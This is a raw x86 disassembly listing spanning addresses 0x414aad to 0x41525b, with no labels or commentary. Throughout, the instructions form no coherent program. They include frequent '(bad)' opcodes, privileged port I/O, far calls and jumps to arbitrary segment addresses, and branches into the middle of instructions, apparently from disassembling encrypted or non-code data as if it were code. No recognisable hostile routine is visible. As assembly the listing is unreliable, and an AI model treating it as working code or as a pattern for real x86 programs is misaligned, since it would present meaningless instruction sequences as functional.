  414aad:	xchg   esi,eax
  414aae:	into   
  414aaf:	xlat   BYTE PTR cs:[ebx]
  414ab1:	jae    0x414a5e
  414ab3:	in     al,0xef
  414ab5:	cmp    BYTE PTR [esi],0xba
  414ab8:	push   ebp
  414ab9:	xchg   ebp,eax
  414aba:	jae    0x414ad0
  414abc:	lods   al,BYTE PTR ds:[esi]
  414abd:	mov    ds:0xe91bfa6e,al
  414ac2:	xchg   BYTE PTR [ebx],dh
  414ac4:	push   ds
  414ac5:	and    DWORD PTR [ecx-0x10c9f105],edi
  414acb:	(bad)  
  414acc:	shr    DWORD PTR [edi-0x69],cl
  414acf:	jb     0x414b06
  414ad1:	xchg   ebx,eax
  414ad2:	imul   ebx,esi,0xd7b7e60
  414ad8:	mov    ch,0x3a
  414ada:	jge    0x414aad
  414adc:	sbb    dl,BYTE PTR [esi-0x1d]
  414adf:	or     DWORD PTR [eax],esi
  414ae1:	fwait
  414ae2:	rol    DWORD PTR [edx],cl
  414ae4:	test   al,0x41
  414ae6:	cmp    dl,BYTE PTR [edi+eiz*2]
  414ae9:	xor    ebx,DWORD PTR [eax-0x12ca9b3f]
  414aef:	rcl    BYTE PTR [ebp+0x23],1
  414af2:	cmp    BYTE PTR [esi-0x7d44c468],0x1c
  414af9:	loopne 0x414aff
  414afb:	div    DWORD PTR [eax]
  414afd:	dec    ecx
  414afe:	lods   al,BYTE PTR ds:[esi]
  414aff:	adc    DWORD PTR [esi+edx*8+0x77],0xaad6ba28
  414b07:	std    
  414b08:	push   edi
  414b09:	sub    eax,0x500cd55a
  414b0e:	call   0x3edf:0x6d13f18a
  414b15:	pop    ds
  414b16:	xchg   ebx,eax
  414b17:	and    DWORD PTR [ebp+ebx*2+0x6b874721],0xab345794
  414b22:	pushf  
  414b23:	mov    DWORD PTR [esp+esi*2+0x3122b798],ebp
  414b2a:	addr16 add ch,0x5f
  414b2e:	mov    ebp,0x74bec31f
  414b33:	sbb    al,0x8d
  414b35:	inc    ebp
  414b36:	stc    
  414b37:	in     al,0x4c
  414b39:	add    BYTE PTR [ecx-0x25],bl
  414b3c:	pop    ebx
  414b3d:	in     eax,dx
  414b3e:	ret    0x7259
  414b41:	jne    0x414af9
  414b43:	push   esp
  414b44:	adc    bh,bl
  414b46:	icebp  
  414b47:	fmulp  st(5),st
  414b49:	push   es
  414b4a:	and    DWORD PTR [ebx],0xffffff89
  414b4d:	stos   BYTE PTR es:[edi],al
  414b4e:	cmp    edx,DWORD PTR [edi]
  414b50:	mov    edx,0x55b0c15f
  414b55:	sti    
  414b56:	pop    edx
  414b57:	sub    al,BYTE PTR ss:[ebx+0x4c3c4260]
  414b5e:	push   esp
  414b5f:	mov    al,0xaf
  414b61:	outs   dx,DWORD PTR es:[esi]
  414b63:	sbb    cl,BYTE PTR [ebp-0x80]
  414b66:	test   BYTE PTR [esi],ah
  414b68:	xchg   esi,eax
  414b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b6a:	lods   al,BYTE PTR ds:[esi]
  414b6b:	imul   esi,DWORD PTR [edx-0x4b],0xffffffae
  414b6f:	cmp    bl,bh
  414b71:	xchg   ebp,eax
  414b72:	cmp    BYTE PTR [edx],al
  414b74:	sub    esi,esi
  414b76:	sti    
  414b77:	or     ebx,DWORD PTR [esi]
  414b79:	cdq    
  414b7a:	call   0xf1c5:0x9413b222
  414b81:	outs   dx,DWORD PTR ds:[esi]
  414b82:	daa    
  414b83:	mov    al,0x86
  414b85:	xor    DWORD PTR ds:0x8c04e688,eax
  414b8b:	and    bl,bl
  414b8d:	pop    esi
  414b8e:	xchg   edx,eax
  414b8f:	lahf   
  414b90:	ins    DWORD PTR es:[edi],dx
  414b91:	pop    esp
  414b92:	push   ss
  414b93:	sbb    esp,DWORD PTR [ecx]
  414b95:	push   eax
  414b96:	mov    dl,0x8a
  414b98:	mov    cs,WORD PTR gs:[ebp+0xe]
  414b9c:	pushf  
  414b9d:	sahf   
  414b9e:	(bad)  
  414b9f:	pushf  
  414ba0:	cmp    DWORD PTR [edi+0x4e],eax
  414ba3:	pop    ebx
  414ba4:	fiadd  DWORD PTR [edi-0x2cf66ea0]
  414baa:	scas   eax,DWORD PTR es:[edi]
  414bab:	test   al,0x8c
  414bad:	fld    DWORD PTR [eax-0x74]
  414bb0:	or     bx,WORD PTR [esi-0x55]
  414bb4:	push   edi
  414bb5:	dec    esp
  414bb6:	mov    ecx,0xc6989fee
  414bbb:	(bad)  
  414bbc:	sub    ebx,ecx
  414bbe:	in     al,0x83
  414bc0:	ds sub al,0xb3
  414bc3:	into   
  414bc4:	pop    ss
  414bc5:	push   esi
  414bc6:	call   0x7a1fdc95
  414bcb:	or     dh,dl
  414bcd:	or     al,0xed
  414bcf:	sbb    DWORD PTR [ecx+0x20],esp
  414bd2:	cmp    DWORD PTR [ebx],esp
  414bd4:	das    
  414bd5:	repnz pusha 
  414bd7:	mov    ah,0xe6
  414bd9:	aad    0x6a
  414bdb:	(bad)  
  414bdc:	lock pop ss
  414bde:	sub    edx,DWORD PTR [eax+edi*8]
  414be1:	push   ebp
  414be2:	fucom  st(4)
  414be4:	test   DWORD PTR [edx+0x3a],esp
  414be7:	iret   
  414be8:	jg     0x414be5
  414bea:	dec    edi
  414beb:	push   esp
  414bec:	mov    eax,ebp
  414bee:	int3   
  414bef:	test   al,0x6d
  414bf1:	retf   0x142
  414bf4:	mov    ds:0x4a60a425,al
  414bf9:	adc    al,0xec
  414bfb:	add    BYTE PTR [edi-0x5b],ah
  414bfe:	sbb    bh,cl
  414c00:	cmp    eax,0x550924c6
  414c05:	push   0x60
  414c07:	fcom   QWORD PTR [ebp-0x1dc99900]
  414c0d:	add    al,0x18
  414c0f:	call   0x3436ef0d
  414c14:	push   cs
  414c15:	outs   dx,DWORD PTR ds:[esi]
  414c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c17:	sub    BYTE PTR [edi+eax*8],bl
  414c1a:	pop    ebp
  414c1b:	mov    ah,0x8f
  414c1d:	mov    BYTE PTR [esi-0x20],ah
  414c20:	gs shr dh,cl
  414c23:	stos   DWORD PTR es:[edi],eax
  414c24:	xchg   esi,eax
  414c25:	add    eax,0xa03f39c7
  414c2a:	jmp    0x414c02
  414c2c:	arpl   WORD PTR [eax-0x7a],bp
  414c2f:	dec    ecx
  414c30:	pusha  
  414c31:	sub    eax,0x76b147dc
  414c36:	pcmpeqb mm7,mm7
  414c39:	(bad)  
  414c3a:	lods   al,BYTE PTR ds:[esi]
  414c3b:	mov    dl,0xb7
  414c3d:	aad    0x6d
  414c3f:	scas   eax,DWORD PTR es:[edi]
  414c40:	fnsave [edx-0x36]
  414c43:	lahf   
  414c44:	pusha  
  414c45:	mov    ds:0xa4f3a731,eax
  414c4a:	retf   
  414c4b:	dec    ebx
  414c4c:	mul    eax
  414c4e:	imul   edi,DWORD PTR [esi-0x4bde3afe],0x45
  414c55:	mov    ebx,0xcb970706
  414c5a:	into   
  414c5b:	out    0xfc,al
  414c5d:	(bad)  
  414c5f:	jmp    0x414c44
  414c61:	sub    eax,0xaa4de459
  414c66:	mov    edx,0xe78b26b3
  414c6b:	push   esi
  414c6c:	sbb    ch,BYTE PTR [edi+0x7772094e]
  414c72:	mov    dh,0x98
  414c74:	loope  0x414cb1
  414c76:	xor    edx,DWORD PTR [edx+0x47]
  414c79:	mov    eax,ds:0x5bcbbacc
  414c7e:	mov    ebx,fs
  414c80:	repnz lods eax,DWORD PTR ds:[esi]
  414c82:	xlat   BYTE PTR ds:[ebx]
  414c83:	lods   al,BYTE PTR ds:[esi]
  414c84:	das    
  414c85:	pop    ss
  414c86:	jo     0x414c8c
  414c88:	jecxz  0x414d09
  414c8a:	pop    esp
  414c8b:	call   0x760:0x4938cd6f
  414c92:	jecxz  0x414cc6
  414c94:	pusha  
  414c95:	fisubr WORD PTR [ebp-0x7d]
  414c98:	mov    ch,bh
  414c9a:	ja     0x414c4c
  414c9c:	xor    al,0x7d
  414c9e:	inc    edi
  414c9f:	add    cl,ch
  414ca1:	popf   
  414ca2:	cmp    BYTE PTR [edi+ecx*1-0x10e38ec4],dl
  414ca9:	in     eax,0xb4
  414cab:	and    DWORD PTR [eax-0x7e],edi
  414cae:	test   BYTE PTR es:[esp+ecx*1],ch
  414cb2:	lds    ecx,FWORD PTR ds:0xb37db385
  414cb8:	xor    BYTE PTR [edi],al
  414cba:	xor    bh,BYTE PTR [ebx-0x17]
  414cbd:	cld    
  414cbe:	or     al,0xdb
  414cc0:	test   bl,0x83
  414cc3:	rol    DWORD PTR [eax+ebx*1+0x4],0xf6
  414cc8:	xchg   BYTE PTR [esi+0x79],bl
  414ccb:	aad    0x3d
  414ccd:	and    eax,DWORD PTR [edi-0x21]
  414cd0:	sub    eax,0x59a40e65
  414cd5:	sbb    al,0xec
  414cd7:	ss jmp 0xe7515e9c
  414cdd:	adc    esp,esi
  414cdf:	loope  0x414c62
  414ce1:	ret    0x3c6f
  414ce4:	mov    bl,0x85
  414ce6:	and    bl,al
  414ce8:	call   0xb6c2:0xe8a9f32c
  414cef:	xchg   esi,esp
  414cf1:	shl    DWORD PTR [edi+0x73c6a7ce],1
  414cf7:	data16 fdivr QWORD PTR [ebx]
  414cfa:	in     al,dx
  414cfb:	jnp    0x414cb7
  414cfd:	loop   0x414d12
  414cff:	xchg   BYTE PTR [esi],ah
  414d01:	dec    esp
  414d02:	and    BYTE PTR [ecx-0x14abfd95],bl
  414d08:	aad    0x53
  414d0a:	push   es
  414d0b:	push   ds
  414d0c:	or     bh,dh
  414d0e:	aam    0x4b
  414d10:	push   0x1a68940b
  414d15:	cmp    BYTE PTR [ebx-0x2b],dl
  414d18:	arpl   bp,si
  414d1a:	push   ss
  414d1b:	jg     0x414d39
  414d1d:	pop    ebx
  414d1e:	ret    
  414d1f:	jg     0x414d23
  414d21:	dec    edi
  414d22:	or     edx,DWORD PTR ds:0x9dd5b167
  414d28:	jo     0x414d0b
  414d2a:	cmp    eax,0x7ef2943a
  414d2f:	iret   
  414d30:	pop    eax
  414d31:	stc    
  414d32:	in     al,0x7a
  414d34:	mov    dh,0x79
  414d36:	dec    edx
  414d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d38:	push   ebx
  414d39:	mov    ds:0x13157118,eax
  414d3e:	sete   bh
  414d41:	mov    bl,0x11
  414d43:	lea    esp,[eax]
  414d45:	(bad)  
  414d46:	in     al,dx
  414d47:	sbb    eax,0x4d26d344
  414d4c:	xchg   ebx,eax
  414d4d:	(bad)  
  414d4e:	std    
  414d4f:	sub    BYTE PTR [edi-0x7b4da038],0x50
  414d56:	and    dl,al
  414d58:	arpl   WORD PTR [edx-0x51],cx
  414d5b:	sahf   
  414d5c:	into   
  414d5d:	int3   
  414d5e:	test   DWORD PTR [esi-0x60],0x5939e291
  414d65:	call   0x9efe8fe6
  414d6a:	mov    ds:0x5c981508,al
  414d6f:	jbe    0x414dc8
  414d71:	lods   al,BYTE PTR ds:[esi]
  414d72:	test   DWORD PTR [edx-0x171d1d18],eax
  414d78:	mov    edi,eax
  414d7a:	js     0x414d44
  414d7c:	inc    edi
  414d7d:	in     al,dx
  414d7e:	sub    BYTE PTR [ecx+0x2766becc],bl
  414d84:	lods   eax,DWORD PTR ds:[esi]
  414d85:	xchg   edx,eax
  414d86:	scas   al,BYTE PTR es:[edi]
  414d87:	retf   0x2b43
  414d8a:	xchg   ebx,eax
  414d8b:	shl    DWORD PTR [edi-0x43cd3f3c],1
  414d91:	cmp    bl,al
  414d93:	ins    BYTE PTR es:[edi],dx
  414d94:	cmp    eax,0x6ffdb401
  414d99:	das    
  414d9a:	jo     0x414db7
  414d9c:	and    DWORD PTR [eax-0x76],esi
  414d9f:	scas   al,BYTE PTR es:[edi]
  414da0:	out    dx,eax
  414da1:	iretw  
  414da3:	pusha  
  414da4:	jmp    0x95b:0xf4e0639f
  414dab:	adc    BYTE PTR [eax-0x38],bh
  414dae:	fist   WORD PTR [edi+ebx*4+0x47]
  414db2:	jmp    0xfb675e01
  414db7:	test   DWORD PTR [ebp+ebx*8+0x2a2ade6b],edi
  414dbe:	xchg   esp,eax
  414dbf:	sti    
  414dc0:	popa   
  414dc1:	inc    ebp
  414dc2:	add    eax,0xf8d6cbd8
  414dc7:	xor    bl,BYTE PTR [eax-0x6742bc0b]
  414dcd:	jbe    0x414da2
  414dcf:	dec    ecx
  414dd0:	mov    bh,0xbf
  414dd2:	or     BYTE PTR [ebp+0x38],al
  414dd5:	gs test eax,0x926542c4
  414ddb:	inc    esi
  414ddc:	xchg   edi,eax
  414ddd:	retf   
  414dde:	push   ebx
  414ddf:	das    
  414de0:	and    eax,0x89f84595
  414de5:	mov    bh,BYTE PTR [esi]
  414de7:	test   al,cl
  414de9:	adc    eax,esp
  414deb:	stos   BYTE PTR es:[edi],al
  414dec:	test   al,0x84
  414dee:	(bad)  
  414df0:	test   ecx,ebp
  414df2:	sbb    BYTE PTR [bp-0x5ab3],0xf0
  414df8:	mov    ch,0xf
  414dfa:	jb     0x414df3
  414dfc:	pop    esp
  414dfd:	retf   0x9b17
  414e00:	jno    0x414e0e
  414e02:	sub    BYTE PTR [edx],dl
  414e04:	adc    ah,BYTE PTR [ebp+0x28518b70]
  414e0a:	cmp    ah,dl
  414e0c:	pop    esi
  414e0d:	mov    cl,bl
  414e0f:	lahf   
  414e10:	inc    esp
  414e11:	add    BYTE PTR [edi],bh
  414e13:	pop    ss
  414e14:	retf   0xa6ee
  414e17:	mov    ch,0xab
  414e19:	mov    eax,ds:0xcf7bc48c
  414e1e:	in     al,0x6b
  414e20:	and    al,al
  414e22:	call   0xf041411d
  414e27:	sub    eax,0xf826c02e
  414e2c:	mov    edx,0xe3e299a2
  414e31:	push   ss
  414e32:	push   ss
  414e33:	sti    
  414e34:	pop    esp
  414e35:	ins    BYTE PTR es:[edi],dx
  414e36:	fcmove st,st(0)
  414e38:	mov    ecx,0xed210bad
  414e3d:	pop    esp
  414e3e:	push   ds
  414e3f:	or     DWORD PTR [edx],ebx
  414e41:	pop    ebx
  414e42:	push   ecx
  414e43:	and    ebp,0xda534411
  414e49:	dec    edx
  414e4a:	cmp    esp,0x3c7ef262
  414e50:	jmp    0xe6241422
  414e55:	sti    
  414e56:	jno    0x414e03
  414e58:	aas    
  414e59:	js     0x414e71
  414e5b:	mov    ebp,0xe3db5ba8
  414e60:	pop    esp
  414e61:	mov    ds:0x6814854b,eax
  414e66:	and    al,0x31
  414e68:	mul    BYTE PTR [ebx+edi*1-0x3f]
  414e6c:	pusha  
  414e6d:	scas   al,BYTE PTR es:[edi]
  414e6e:	jno    0x414df3
  414e70:	nop
  414e71:	inc    ebx
  414e72:	repnz cmp BYTE PTR [ebx*4+0x19def8bf],cl
  414e7a:	xor    eax,0x8ae96595
  414e7f:	and    eax,0xab621f8d
  414e84:	pop    eax
  414e85:	add    al,0x97
  414e87:	test   BYTE PTR [ecx+0x1b1078cc],bl
  414e8d:	ss dec esp
  414e8f:	push   ebp
  414e90:	data16 mov ah,0x66
  414e93:	push   esp
  414e94:	sbb    eax,0xf5704c2f
  414e99:	scas   al,BYTE PTR es:[edi]
  414e9a:	mov    ch,0x92
  414e9c:	pop    ebx
  414e9d:	cmp    al,0x18
  414e9f:	inc    edi
  414ea0:	inc    esi
  414ea1:	(bad)  
  414ea2:	and    al,0x2f
  414ea4:	xchg   BYTE PTR [esi*8-0x56539387],cl
  414eab:	xor    esi,DWORD PTR [ecx+esi*4-0x4a]
  414eaf:	jnp    0x414eaa
  414eb1:	add    esp,DWORD PTR [edi+0x2cd61a3a]
  414eb7:	pop    eax
  414eb8:	cmp    DWORD PTR [edx],ebx
  414eba:	push   esp
  414ebb:	stos   BYTE PTR es:[edi],al
  414ebc:	sbb    al,dh
  414ebe:	dec    esp
  414ebf:	xor    DWORD PTR [esi+0x2ed2708f],ebx
  414ec5:	ror    DWORD PTR [edx-0x76],1
  414ec8:	sub    dl,dl
  414eca:	xor    ah,al
  414ecc:	add    cl,dl
  414ece:	pop    ebp
  414ecf:	int    0x9e
  414ed1:	(bad)  
  414ed2:	xor    DWORD PTR [edi-0x4b],ebx
  414ed5:	imul   BYTE PTR [ebx-0x47]
  414ed8:	(bad)  
  414ed9:	aas    
  414eda:	bound  ebp,QWORD PTR [ebx-0x5f91b18d]
  414ee0:	pop    es
  414ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ee2:	scas   eax,DWORD PTR es:[edi]
  414ee3:	cld    
  414ee4:	adc    DWORD PTR [ebp+0x32],edi
  414ee7:	dec    ebx
  414ee8:	ins    DWORD PTR es:[edi],dx
  414ee9:	mov    al,ds:0xc3611337
  414eee:	push   edx
  414eef:	sbb    eax,0x74b1c27b
  414ef4:	sti    
  414ef5:	int3   
  414ef6:	xchg   DWORD PTR [eax+0x42],esp
  414ef9:	dec    edx
  414efa:	add    DWORD PTR [eax+0x60],0x47
  414efe:	mov    DWORD PTR [esi],edx
  414f00:	mov    ebx,0x811dca4d
  414f05:	mov    ebp,0x339bb96c
  414f0a:	loop   0x414f5b
  414f0c:	and    edi,edx
  414f0e:	jbe    0x414ecd
  414f10:	aas    
  414f11:	jle    0x414f82
  414f13:	int    0x28
  414f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f16:	add    DWORD PTR [edx],ecx
  414f18:	jl     0x414f86
  414f1a:	push   es
  414f1b:	mov    edi,0xd047e649
  414f20:	push   0xffffffa9
  414f22:	mov    ebp,0x287425a5
  414f27:	hlt    
  414f28:	(bad)  
  414f29:	mov    al,0x1d
  414f2b:	dec    esi
  414f2c:	sahf   
  414f2d:	push   0x78
  414f2f:	mov    gs,WORD PTR [esi+0x64227b98]
  414f35:	imul   DWORD PTR [esi-0x1c]
  414f38:	cmp    al,0x8e
  414f3a:	pop    edi
  414f3b:	(bad)  
  414f3c:	xchg   esi,eax
  414f3d:	mov    ds:0xdc3d64fd,al
  414f42:	xchg   esp,eax
  414f43:	pusha  
  414f44:	fwait
  414f45:	mov    al,ds:0x95d297b5
  414f4a:	test   al,0xe8
  414f4c:	cwde   
  414f4d:	jp     0x414f0b
  414f4f:	jecxz  0x414f56
  414f51:	scas   eax,DWORD PTR es:[edi]
  414f52:	and    al,0xaa
  414f54:	mov    dh,0x5a
  414f56:	jl     0x414f13
  414f58:	outs   dx,BYTE PTR ds:[esi]
  414f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f5a:	les    esp,FWORD PTR [eax+edx*8]
  414f5d:	jmp    0x8101:0xc56dd90
  414f64:	test   eax,0x769462d5
  414f69:	dec    eax
  414f6a:	xor    DWORD PTR gs:[edx],esi
  414f6d:	stc    
  414f6e:	call   0xf903:0x54859b9e
  414f75:	cld    
  414f76:	inc    esi
  414f77:	fbld   TBYTE PTR [ecx]
  414f79:	aam    0xf4
  414f7b:	dec    eax
  414f7c:	and    eax,0x5f
  414f7f:	xchg   ebx,ecx
  414f81:	pop    es
  414f82:	ins    BYTE PTR es:[edi],dx
  414f83:	mov    dh,0x5b
  414f85:	aas    
  414f86:	and    DWORD PTR [ebx-0x33],esp
  414f89:	jg     0x414f7b
  414f8b:	and    BYTE PTR [ebx],cl
  414f8d:	push   esi
  414f8e:	mov    WORD PTR [eax+0x66],gs
  414f91:	data16 (bad) [edx+0x34]
  414f95:	fst    QWORD PTR [ecx-0x5feb2f58]
  414f9b:	push   0xffffffc8
  414f9d:	popf   
  414f9e:	(bad)  
  414f9f:	out    dx,eax
  414fa0:	cli    
  414fa1:	cmp    eax,0x3e7c9d25
  414fa6:	cld    
  414fa7:	aad    0xf
  414fa9:	jmp    0x414fcc
  414fab:	pop    ss
  414fac:	idiv   BYTE PTR [esi+eax*2+0x5d]
  414fb0:	hlt    
  414fb1:	and    ah,BYTE PTR [ebp-0x2151b45a]
  414fb7:	rol    BYTE PTR [ebx+ecx*4+0x51],cl
  414fbb:	inc    ecx
  414fbc:	sub    BYTE PTR [esp+ebx*2-0x363537a],cl
  414fc3:	mov    ebp,edx
  414fc5:	jecxz  0x415000
  414fc7:	xchg   ebp,eax
  414fc8:	push   ebx
  414fc9:	mov    dl,0x2d
  414fcb:	add    BYTE PTR [esi-0x4],dh
  414fce:	mov    eax,ds:0xa6625cc9
  414fd3:	mov    cl,0xf9
  414fd5:	repz leave 
  414fd7:	repz mov dh,0x63
  414fda:	cmc    
  414fdb:	ror    DWORD PTR [ebp-0x41b1b5a7],1
  414fe1:	push   ss
  414fe2:	stc    
  414fe3:	sti    
  414fe4:	jmp    0x415022
  414fe6:	adc    ah,0xe8
  414fe9:	or     BYTE PTR [eax-0x2f],dh
  414fec:	jmp    0x29300084
  414ff1:	xor    eax,0xf07dc27b
  414ff6:	dec    esp
  414ff7:	call   FWORD PTR [eax-0x4e11d70f]
  414ffd:	pop    edi
  414ffe:	rcr    BYTE PTR [esi+0x3ba61376],0x9f
  415005:	inc    edi
  415006:	ss jle 0x41503e
  415009:	ret    0x3b82
  41500c:	and    DWORD PTR [eax+0x67b3fe64],ebp
  415012:	(bad)  
  415013:	and    DWORD PTR [esi+0x1305a4a8],ebx
  415019:	pushf  
  41501a:	mov    ebp,0x826f5fcc
  41501f:	es xchg edi,eax
  415021:	setae  BYTE PTR [ebx+0x70]
  415025:	jecxz  0x415003
  415027:	in     al,dx
  415028:	and    eax,0xe926c948
  41502d:	sahf   
  41502e:	ret    
  41502f:	and    BYTE PTR [ebx],al
  415031:	jb     0x414fd1
  415033:	push   edi
  415034:	mov    esi,0xc605dd6c
  415039:	ins    BYTE PTR es:[edi],dx
  41503a:	jmp    0x41509a
  41503c:	push   esi
  41503d:	xor    DWORD PTR [esi+0x1aca5789],edi
  415043:	in     al,0xc5
  415045:	and    cl,dl
  415047:	imul   eax,esp,0x7b554f95
  41504d:	(bad)  
  41504e:	and    eax,0xe722ae12
  415053:	add    al,0xdb
  415055:	sub    DWORD PTR [eax+0x36998906],edx
  41505b:	stos   BYTE PTR es:[edi],al
  41505c:	fbstp  TBYTE PTR [edi-0xb]
  41505f:	cwde   
  415060:	test   al,0xa2
  415062:	out    0x99,al
  415064:	sub    BYTE PTR [eax+edx*1+0x5e],ah
  415068:	ror    BYTE PTR [ecx],cl
  41506a:	xchg   esi,eax
  41506b:	test   eax,0x5212f967
  415070:	jmp    0x2da6b058
  415075:	mov    ebp,edi
  415077:	pop    ebp
  415078:	shl    DWORD PTR [ebp+0x27],cl
  41507b:	xor    bh,BYTE PTR [edi]
  41507d:	sti    
  41507e:	in     al,dx
  41507f:	aad    0x1c
  415081:	or     DWORD PTR [edi-0x36],ebx
  415084:	into   
  415085:	push   0xad76aba1
  41508a:	gs das 
  41508c:	data16 js 0x4150cf
  41508f:	jl     0x415034
  415091:	clc    
  415092:	js     0x41502e
  415094:	sbb    dh,BYTE PTR [ebx-0x2a17b440]
  41509a:	outs   dx,BYTE PTR ds:[esi]
  41509b:	or     ecx,eax
  41509d:	jecxz  0x4150c6
  41509f:	retf   
  4150a0:	adc    edi,ebp
  4150a2:	int    0x37
  4150a4:	xor    DWORD PTR [ebp-0x27eb9fd6],esp
  4150aa:	add    al,0x17
  4150ac:	ja     0x4150ba
  4150ae:	addr16 in al,0x76
  4150b1:	(bad)  
  4150b2:	mov    esi,0xad12ed6d
  4150b7:	inc    esi
  4150b8:	imul   esi,DWORD PTR [ebx+0x5bab279e],0xe73ec1c2
  4150c2:	pop    ecx
  4150c3:	aad    0x60
  4150c5:	loopne 0x4150ad
  4150c7:	jp     0x415127
  4150c9:	sbb    DWORD PTR [ecx+0x681414eb],edi
  4150cf:	(bad)  
  4150d0:	cmp    dh,BYTE PTR [ebp+0x2e]
  4150d3:	pop    eax
  4150d4:	xchg   DWORD PTR [edx-0x77],ebp
  4150d7:	xor    bl,BYTE PTR [eax-0x10]
  4150da:	lods   al,BYTE PTR ds:[esi]
  4150db:	mov    ds:0xd1eb0878,eax
  4150e0:	shr    al,0x3b
  4150e3:	popf   
  4150e4:	fsubp  st(0),st
  4150e6:	sub    DWORD PTR [esi],0x5faac3da
  4150ec:	push   es
  4150ed:	iret   
  4150ee:	data16 cs jmp 0x4150d3
  4150f2:	inc    ebx
  4150f3:	jmp    0x6962:0x89fea207
  4150fa:	fisttp WORD PTR [esi]
  4150fc:	or     dl,BYTE PTR [ebx+0x29]
  4150ff:	pop    edx
  415100:	xchg   esp,eax
  415101:	pop    ebp
  415102:	enter  0x7ce3,0x6e
  415106:	(bad)  
  415107:	mov    ecx,0xd1a2c736
  41510c:	mov    ebx,0x481397eb
  415111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415112:	push   ebx
  415113:	sbb    ah,dl
  415115:	push   0x2
  415117:	test   eax,0xe1e597ca
  41511c:	stos   DWORD PTR es:[edi],eax
  41511d:	ror    edi,0x45
  415120:	dec    ecx
  415121:	clc    
  415122:	in     eax,0xca
  415124:	inc    edi
  415125:	jbe    0x415176
  415127:	jg     0x4151a5
  415129:	push   edi
  41512a:	daa    
  41512b:	or     DWORD PTR [esp+esi*8],ebx
  41512e:	sbb    eax,0x37149a57
  415133:	push   ebp
  415134:	inc    eax
  415135:	test   BYTE PTR [eax],0xf2
  415138:	and    ah,BYTE PTR [edx+0x73]
  41513b:	pop    edi
  41513c:	sbb    al,0x6d
  41513e:	dec    esp
  41513f:	or     dh,cl
  415141:	imul   edx,DWORD PTR [edx+ebx*4],0xd1585ff6
  415148:	mov    eax,ds:0x3a175ec
  41514d:	jmp    0x5461:0x80dce39
  415154:	sub    edi,DWORD PTR [ebp+0x3ac35076]
  41515a:	stos   DWORD PTR es:[edi],eax
  41515b:	retf   0x4064
  41515e:	and    al,0x4d
  415160:	(bad)  
  415161:	sub    ch,dh
  415163:	pop    ecx
  415164:	out    dx,al
  415165:	xchg   ebp,eax
  415166:	xor    DWORD PTR [ecx+0x7bb04709],esi
  41516c:	sbb    al,0x80
  41516e:	xchg   bh,al
  415170:	add    eax,0x7bfab5a1
  415175:	sub    BYTE PTR [edi+edx*2+0x5324a74d],ch
  41517c:	push   edi
  41517d:	je     0x4151bf
  41517f:	sbb    dl,bh
  415181:	and    edx,eax
  415183:	mov    dh,0x45
  415185:	cmp    BYTE PTR [edi],bh
  415187:	enter  0x2241,0xa0
  41518b:	je     0x415165
  41518d:	xor    al,0x1
  41518f:	sub    ah,BYTE PTR [ebx-0x1]
  415192:	sar    edx,0x1
  415195:	adc    al,0x47
  415197:	test   esi,eax
  415199:	add    edx,DWORD PTR [eax-0x39]
  41519c:	or     esp,DWORD PTR [edi+0x66e1647e]
  4151a2:	hlt    
  4151a3:	lods   al,BYTE PTR ds:[esi]
  4151a4:	xchg   edi,eax
  4151a5:	xchg   esp,eax
  4151a6:	into   
  4151a7:	xor    al,0xfb
  4151a9:	cmp    DWORD PTR [esi+0x5e],edx
  4151ac:	out    dx,eax
  4151ad:	rcl    BYTE PTR [ebx+0x30],cl
  4151b0:	jle    0x415190
  4151b2:	(bad)  
  4151b3:	lds    esp,FWORD PTR [esp+ebp*1]
  4151b6:	mov    ebx,0x6bc4b8e0
  4151bb:	js     0x41517f
  4151bd:	in     al,dx
  4151be:	rcr    esi,1
  4151c0:	add    eax,0xf8151e07
  4151c5:	ss hlt 
  4151c7:	popf   
  4151c8:	cld    
  4151c9:	inc    ebp
  4151ca:	popa   
  4151cb:	sub    dh,BYTE PTR ds:0x9fdfac9f
  4151d1:	mov    al,0xd9
  4151d3:	jnp    0x415229
  4151d5:	xor    al,0x5c
  4151d7:	add    al,ch
  4151d9:	xchg   DWORD PTR [ecx],eax
  4151db:	jne    0x415255
  4151dd:	dec    edx
  4151de:	xchg   DWORD PTR [ebx+0x441b681b],esp
  4151e4:	dec    ecx
  4151e5:	pop    edi
  4151e6:	test   DWORD PTR [esi],esp
  4151e8:	xor    eax,esp
  4151ea:	in     eax,0x38
  4151ec:	shl    BYTE PTR [edx+0x72],cl
  4151ef:	mov    ebx,0xcaedcfa0
  4151f4:	data16 (bad) 
  4151f6:	mov    ebx,0x5d8d147d
  4151fb:	or     bh,BYTE PTR [esi]
  4151fd:	jmp    0x415183
  4151ff:	cmp    BYTE PTR [esi],0x12
  415202:	mov    BYTE PTR [ebp-0x76],ch
  415205:	(bad)  
  415206:	push   ebx
  415207:	fsubr  DWORD PTR [esi-0x2cb4174]
  41520d:	xor    eax,0x77a6f59c
  415212:	es ins DWORD PTR es:[edi],dx
  415214:	aam    0x81
  415216:	jp     0x41524b
  415218:	imul   ebx,DWORD PTR [edi-0x19],0xffffffe1
  41521c:	or     eax,0x858196bb
  415221:	ror    BYTE PTR [esi],0x16
  415224:	push   ss
  415225:	xchg   ebx,eax
  415226:	in     al,dx
  415227:	jecxz  0x4152a2
  415229:	ins    DWORD PTR es:[edi],dx
  41522a:	or     BYTE PTR [edx],dh
  41522c:	pop    es
  41522d:	inc    edx
  41522e:	js     0x415271
  415230:	int3   
  415231:	lea    edx,[esi+0x15]
  415234:	xchg   edi,eax
  415235:	jbe    0x41525b
  415237:	cdq    
  415238:	(bad)  
  415239:	fdiv   QWORD PTR [edx+edi*1+0x2d]
  41523d:	jne    0x415254
  41523f:	popf   
  415240:	cmp    al,0xda
  415242:	sbb    al,0xbc
  415244:	cmp    BYTE PTR [edx],bh
  415246:	outs   dx,BYTE PTR ds:[esi]
  415247:	inc    edx
  415248:	mov    ebx,0xffcd9d1d
  41524d:	inc    esi
  41524e:	test   al,0x35
  415250:	stos   DWORD PTR es:[edi],eax
  415251:	xchg   edx,eax
  415252:	inc    edi
  415253:	cld    
  415254:	pop    ss
  415255:	pop    DWORD PTR [ecx-0x14]
  415258:	lods   eax,DWORD PTR ds:[esi]
  415259:	lock inc ebp
  41525b:	(bad)  
